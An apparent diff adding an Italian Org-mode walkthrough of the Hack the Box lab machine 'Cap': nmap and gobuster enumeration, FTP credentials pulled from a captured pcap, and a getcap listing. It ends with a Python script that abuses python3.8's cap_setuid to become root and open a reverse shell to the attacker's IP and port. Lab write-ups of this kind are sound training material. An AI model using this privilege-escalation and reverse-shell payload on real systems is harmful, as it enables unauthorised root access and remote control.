@@ -1,0 +1,223 @@
+#+TITLE: HTB - Cap
+#+AUTHOR: Leonardo Tamiano
+#+EMAIL: leonardotamiano95@gmail.com
+
+* Basic Info
+  :PROPERTIES:
+  :UNNUMBERED: t
+  :END:  
+  - *Table of contents*:
+    #+TOC: headlines 2
+
+  ------------------------
+  
+  A seguire è riportato un breve walkthrough della macchina *Cap*
+  offerta dalla piattaforma Hack the Box.
+
+* Enumeration
+** nmap
+*** leo@kali:~/repos/cap$ nmap -p- cap
+    #+begin_example
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-20 19:08 CEST
+Nmap scan report for cap (10.129.242.67)
+Host is up (0.052s latency).
+Not shown: 65532 closed ports
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 18.15 seconds
+    #+end_example
+
+*** leo@kali:~/repos/cap$ nmap -sC -sV cap
+    #+begin_example
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-20 19:08 CEST
+Stats: 0:01:19 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 66.67% done; ETC: 19:10 (0:00:39 remaining)
+Nmap scan report for cap (10.129.242.67)
+Host is up (0.052s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
+|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
+|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
+80/tcp open  http    gunicorn
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 404 NOT FOUND
+|     Server: gunicorn
+|     Date: Wed, 20 Oct 2021 17:08:26 GMT
+|     Connection: close
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 232
+|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+|     <title>404 Not Found</title>
+|     <h1>Not Found</h1>
+|     <p>The requested URL was not found on the server. If you entered the URL manu
+ally please check your spelling and try again.</p>
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Server: gunicorn
+|     Date: Wed, 20 Oct 2021 17:08:21 GMT
+|     Connection: close
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 19386
+|     <!DOCTYPE html>
+|     <html class="no-js" lang="en">
+|     <head>
+|     <meta charset="utf-8">
+|     <meta http-equiv="x-ua-compatible" content="ie=edge">
+|     <title>Security Dashboard</title>
+|     <meta name="viewport" content="width=device-width, initial-scale=1">
+|     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.
+ico">
+|     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
+|     <link rel="stylesheet" href="/static/css/font-awesome.min.css">
+|     <link rel="stylesheet" href="/static/css/themify-icons.css">
+|     <link rel="stylesheet" href="/static/css/metisMenu.css">
+|     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
+|     <link rel="stylesheet" href="/static/css/slicknav.min.css">
+|     <!-- amchar
+|   HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     Server: gunicorn
+|     Date: Wed, 20 Oct 2021 17:08:21 GMT
+|     Connection: close
+|     Content-Type: text/html; charset=utf-8
+|     Allow: OPTIONS, HEAD, GET
+|     Content-Length: 0
+|   RTSPRequest: 
+|     HTTP/1.1 400 Bad Request
+|     Connection: close
+|     Content-Type: text/html
+|     Content-Length: 196
+|     <html>
+|     <head>
+|     <title>Bad Request</title>
+|     </head>
+|     <body>
+|     <h1><p>Bad Request</p></h1>
+|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
+|     </body>
+|_    </html>
+|_http-server-header: gunicorn
+|_http-title: Security Dashboard
+1 service unrecognized despite returning data. If you know the service/version, ple
+ase submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-ser
+vice :
+SF-Port80-TCP:V=7.91%I=7%D=10/20%Time=61704D04%P=x86_64-pc-linux-gnu%r(Get
+SF:Request,2FE5,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x2
+SF:0Wed,\x2020\x20Oct\x202021\x2017:08:21\x20GMT\r\nConnection:\x20close\r
+SF:\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2019
+SF:386\r\n\r\n<!DOCTYPE\x20html>\n<html\x20class=\"no-js\"\x20lang=\"en\">
+SF:\n\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x
+SF:20<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x20
+SF:\x20\x20\x20<title>Security\x20Dashboard</title>\n\x20\x20\x20\x20<meta
+SF:\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-scale
+SF:=1\">\n\x20\x20\x20\x20<link\x20rel=\"shortcut\x20icon\"\x20type=\"imag
+SF:e/png\"\x20href=\"/static/images/icon/favicon\.ico\">\n\x20\x20\x20\x20
+SF:<link\x20rel=\"stylesheet\"\x20href=\"/static/css/bootstrap\.min\.css\"
+SF:>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/fo
+SF:nt-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x2
+SF:0href=\"/static/css/themify-icons\.css\">\n\x20\x20\x20\x20<link\x20rel
+SF:=\"stylesheet\"\x20href=\"/static/css/metisMenu\.css\">\n\x20\x20\x20\x
+SF:20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/owl\.carousel\.min\
+SF:.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/
+SF:css/slicknav\.min\.css\">\n\x20\x20\x20\x20<!--\x20amchar")%r(HTTPOptio
+SF:ns,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Wed,\x
+SF:2020\x20Oct\x202021\x2017:08:21\x20GMT\r\nConnection:\x20close\r\nConte
+SF:nt-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20OPTIONS,\x20HEAD,\
+SF:x20GET\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,121,"HTTP/1\.1\x
+SF:20400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20tex
+SF:t/html\r\nContent-Length:\x20196\r\n\r\n<html>\n\x20\x20<head>\n\x20\x2
+SF:0\x20\x20<title>Bad\x20Request</title>\n\x20\x20</head>\n\x20\x20<body>
+SF:\n\x20\x20\x20\x20<h1><p>Bad\x20Request</p></h1>\n\x20\x20\x20\x20Inval
+SF:id\x20HTTP\x20Version\x20&#x27;Invalid\x20HTTP\x20Version:\x20&#x27;RTS
+SF:P/1\.0&#x27;&#x27;\n\x20\x20</body>\n</html>\n")%r(FourOhFourRequest,18
+SF:9,"HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x20
+SF:Wed,\x2020\x20Oct\x202021\x2017:08:26\x20GMT\r\nConnection:\x20close\r\
+SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20232
+SF:\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\x2
+SF:0Final//EN\">\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</h1
+SF:>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20se
+SF:rver\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20c
+SF:heck\x20your\x20spelling\x20and\x20try\x20again\.</p>\n");
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.or
+g/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 132.46 seconds    
+    #+end_example
+** gobuster
+*** leo@kali:~/repos/cap$ gobuster dir -u cap -w ~/repos/wordlists/dirbuster/directory-list-2.3-medium.txt 
+    #+begin_example
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://cap
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /home/leo/repos/wordlists/dirbuster/directory-list-2.3
+-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/10/20 19:21:51 Starting gobuster in directory enumeration mode
+===============================================================
+/data                 (Status: 302) [Size: 208] [--> http://cap/]
+/ip                   (Status: 200) [Size: 17368]                
+/netstat              (Status: 200) [Size: 32198]                
+/capture              (Status: 302) [Size: 220] [--> http://cap/data/3]
+Progress: 16858 / 220561 (7.64%)
+[!] Keyboard interrupt detected, terminating.
+                                                                       
+===============================================================
+2021/10/20 19:23:25 Finished
+===============================================================    
+    #+end_example
+
+** pcap file
+   Tramite ~wireshark~ abbiamo analizato il file presente nell'url
+   ~http://cap/data/0~ e abbiamo trovato le seguenti credenziali per
+   accedere al server ftp.
+
+   nathan:Buck3tH4TF0RM3!
+   
+* Priv Esc
+** nathan
+   nathan:Buck3tH4TF0RM3!
+
+*** sudo -l
+    #+begin_example
+Sorry, user nathan may not run sudo on cap.    
+    #+end_example
+*** getcap -r / 2>/dev/null
+    #+begin_example
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep    
+    #+end_example
+*** to get root
+    #+begin_src python
+#!/usr/bin/python3.8
+
+import os, socket, subprocess
+
+os.setuid(0)
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("10.10.14.83", 4321))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+
+p = subprocess.call(["/bin/sh", "-i"])    
+    #+end_src
